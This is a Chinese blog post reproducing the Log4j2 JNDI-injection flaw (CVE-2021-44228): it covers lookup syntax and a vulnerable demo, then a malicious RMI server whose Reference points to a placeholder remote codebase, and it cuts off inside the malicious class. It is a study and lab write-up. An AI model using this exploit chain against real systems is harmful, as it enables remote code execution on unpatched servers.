<!DOCTYPE html>
<html lang="zh-CN">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Log4j2 漏洞复现 - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/log4j2/">
  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
  <meta property="og:title" content="Log4j2 漏洞复现">
  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-02-09T00:10:48+08:00">
    <meta property="article:modified_time" content="2025-02-09T00:10:48+08:00">
    <meta property="article:tag" content="Java">
    <meta property="article:tag" content="漏洞复现">
    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
  <meta name="twitter:title" content="Log4j2 漏洞复现">
  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
<meta name="application-name" content="gaorenyusi">
<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/log4j2/" /><link rel="prev" href="http://localhost:1313/posts/github_pages%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/" /><link rel="next" href="http://localhost:1313/posts/aliyunctf/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Log4j2 漏洞复现",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/posts\/log4j2\/"
        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "java, 漏洞复现","wordcount":  2696 ,
        "url": "http:\/\/localhost:1313\/posts\/log4j2\/","datePublished": "2025-02-09T00:10:48+08:00","dateModified": "2025-02-09T00:10:48+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
                "@type": "Person",
                "name": "gaorenyusi"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Log4j2 漏洞复现</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/javasec/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Javasec</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-02-09">2025-02-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 2696 字&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#log4j2-介绍">Log4j2 介绍</a></li>
    <li><a href="#漏洞介绍">漏洞介绍</a></li>
    <li><a href="#影响版本">影响版本</a></li>
    <li><a href="#环境搭建">环境搭建</a></li>
    <li><a href="#漏洞复现">漏洞复现</a></li>
    <li><a href="#漏洞分析">漏洞分析</a></li>
    <li><a href="#漏洞修复">漏洞修复</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="apache_log4j2cve-2021-44228漏洞复现">Apache_log4j2（CVE-2021-44228）漏洞复现</h1>
<h2 id="log4j2-介绍">Log4j2 介绍</h2>
<p>log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具。在log4j框架的基础上进行了改进，并引入了丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。</p>
<h2 id="漏洞介绍">漏洞介绍</h2>
<p>Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。</p>
<p>2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。</p>
<p>在java中最常用的日志框架是log4j2和logback，其中log4j2支持<strong>lookup</strong>功能（查找搜索），这也是一个非常强大的功能，设计之初的目的也是为了方便开发者调用</p>
<p>例如当开发者想在日志中打印今天的日期，则只需要输出<code>${data:MM-dd-yyyy}</code>，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。</p>
<p>表达式除了支持日期，还支持输出系统环境变量等功能，这样极大的方便了开发者。但是安全问题往往就是因为“图方便”引起的，毕竟设计者也是需要在安全性和用户体验之间做个平衡。</p>
<p>其实打印日期，打印系统变量这种对系统而言构不成什么威胁，最终要的原因是<strong>log4j还支持JNDI协议。</strong></p>
<h2 id="影响版本">影响版本</h2>
<p>2.0 &lt;= Apache log4j2 &lt;= 2.14.1</p>
<h2 id="环境搭建">环境搭建</h2>
<p>pom.xml</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependencies&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>log4j-core<span class="nt">&lt;/artifactId&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.14.1<span class="nt">&lt;/version&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>log4j-api<span class="nt">&lt;/artifactId&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.14.1<span class="nt">&lt;/version&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>junit<span class="nt">&lt;/groupId&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>junit<span class="nt">&lt;/artifactId&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>4.12<span class="nt">&lt;/version&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependencies&gt;</span></span></span></code></pre></div></div><p>log4j2 的一些实现方式，什么 xml，yaml，properties 等很多方式。这里，我们简单用 xml 的方式来实现，文件如下，默认文件名为log4j2.xml，</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- log4j2 配置文件 --&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 日志级别 trace&lt;debug&lt;info&lt;warn&lt;error&lt;fatal --&gt;</span><span class="nt">&lt;configuration</span> <span class="na">status=</span><span class="s">&#34;info&#34;</span><span class="nt">&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 自定义属性 --&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Properties&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 日志格式(控制台) --&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Property</span> <span class="na">name=</span><span class="s">&#34;pattern1&#34;</span><span class="nt">&gt;</span>[%-5p] %d %c - %m%n<span class="nt">&lt;/Property&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 日志格式(文件) --&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Property</span> <span class="na">name=</span><span class="s">&#34;pattern2&#34;</span><span class="nt">&gt;</span>  
</span></span><span class="line"><span class="cl">            =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/Property&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 日志文件路径 --&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;Property</span> <span class="na">name=</span><span class="s">&#34;filePath&#34;</span><span class="nt">&gt;</span>logs/myLog.log<span class="nt">&lt;/Property&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Properties&gt;</span>    <span class="nt">&lt;appenders&gt;</span> <span class="nt">&lt;Console</span> <span class="na">name=</span><span class="s">&#34;Console&#34;</span> <span class="na">target=</span><span class="s">&#34;SYSTEM_OUT&#34;</span><span class="nt">&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;PatternLayout</span> <span class="na">pattern=</span><span class="s">&#34;${pattern1}&#34;</span><span class="nt">/&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Console&gt;</span> <span class="nt">&lt;RollingFile</span> <span class="na">name=</span><span class="s">&#34;RollingFile&#34;</span> <span class="na">fileName=</span><span class="s">&#34;${filePath}&#34;</span>  
</span></span><span class="line"><span class="cl">                            <span class="na">filePattern=</span><span class="s">&#34;logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz&#34;</span><span class="nt">&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;PatternLayout</span> <span class="na">pattern=</span><span class="s">&#34;${pattern2}&#34;</span><span class="nt">/&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;SizeBasedTriggeringPolicy</span> <span class="na">size=</span><span class="s">&#34;5 MB&#34;</span><span class="nt">/&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/RollingFile&gt;</span> <span class="nt">&lt;/appenders&gt;</span> <span class="nt">&lt;loggers&gt;</span> <span class="nt">&lt;root</span> <span class="na">level=</span><span class="s">&#34;info&#34;</span><span class="nt">&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;appender-ref</span> <span class="na">ref=</span><span class="s">&#34;Console&#34;</span><span class="nt">/&gt;</span>  
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;appender-ref</span> <span class="na">ref=</span><span class="s">&#34;RollingFile&#34;</span><span class="nt">/&gt;</span>  
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/root&gt;</span> <span class="nt">&lt;/loggers&gt;&lt;/configuration&gt;</span></span></span></code></pre></div></div><p>然后再写一个实际应用的 demo，比如从数据库获取到了一个 username 为 &ldquo;admin&rdquo;，要把它登录进来的信息打印到日志里面，这个路径一般有一个 /logs 的文件夹的。</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.LogManager</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.Logger</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.function.LongFunction</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Logger</span><span class="w"> </span><span class="n">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LogManager</span><span class="p">.</span><span class="na">getLogger</span><span class="p">(</span><span class="n">LongFunction</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;${java:os}&#34;</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">logger</span><span class="p">.</span><span class="na">info</span><span class="p">(</span><span class="s">&#34;User {} login in!&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;User {} not exists&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p>运行结果，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130212129245.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130212129245.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130212129245.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130212129245.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130212129245.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130212129245.png" /></p>
<p>上面说了 log4j2 会把 <code>${}</code> 包裹内容进行单独处理，利用 lookup 功能进行查找。Log4j2 内置了多个 Lookup 实现，每个 Lookup 都有不同的用途和功能。以下是一些常见的 Lookup 类型：</p>
<ol>
<li>${date}：获取当前日期和时间，支持自定义格式。</li>
<li>${pid}：获取当前进程的 ID。</li>
<li>${logLevel}：获取当前日志记录的级别。</li>
<li>${sys:propertyName}：获取系统属性的值，例如 ${sys:user.home} 获取用户主目录。</li>
<li>${env:variableName}：获取环境变量的值，例如 ${env:JAVA_HOME} 获取 Java 安装路径。</li>
<li>${ctx:key}：获取日志线程上下文（ThreadContext）中指定键的值。</li>
<li>${class:fullyQualifiedName:methodName}：获取指定类的静态方法的返回值。</li>
<li>${mdc:key}：获取 MDC (Mapped Diagnostic Context) 中指定键的值。</li>
</ol>
<p>这里把上面的 <code>admin</code> 替换为 <code>${sys:user.dir}</code>，再次运行，</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130214404949.png"
        data-srcset="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130214404949.png, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130214404949.png 1.5x, https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130214404949.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130214404949.png"
        title="https://raw.githubusercontent.com/gaorenyusi/img/master/img/file-20250130214404949.png" /></p>
<p>而造成漏洞是因为这里的 lookup 它是基于 jndi 的，而 jndi 里面我们早在之前说过直接调用 lookup() 是会存在漏洞的。</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>自己编写一个 RMIServer，</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Reference</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.Naming</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.registry.LocateRegistry</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMI_Server</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">register</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reference</span><span class="w"> </span><span class="n">reference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Reference</span><span class="p">(</span><span class="s">&#34;RMI_POC&#34;</span><span class="p">,</span><span class="s">&#34;RMI_POC&#34;</span><span class="p">,</span><span class="s">&#34;http://ip:6666/&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">refObjWrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ReferenceWrapper</span><span class="p">(</span><span class="n">reference</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Naming</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;hello&#34;</span><span class="p">,</span><span class="n">refObjWrapper</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;START RUN&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">RMI_Server</span><span class="p">().</span><span class="na">register</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></div></div><p>搭建好恶意的 RMI 服务器，并且在远端服务器上放置恶意类，RMI_POC.java</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-bash">
        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Context</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.Name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.spi.ObjectFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.RemoteException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIHello</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">UnicastRemoteObject</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">ObjectFactory</span><span class="w"> </span><span class="p">{</span><span class="w">
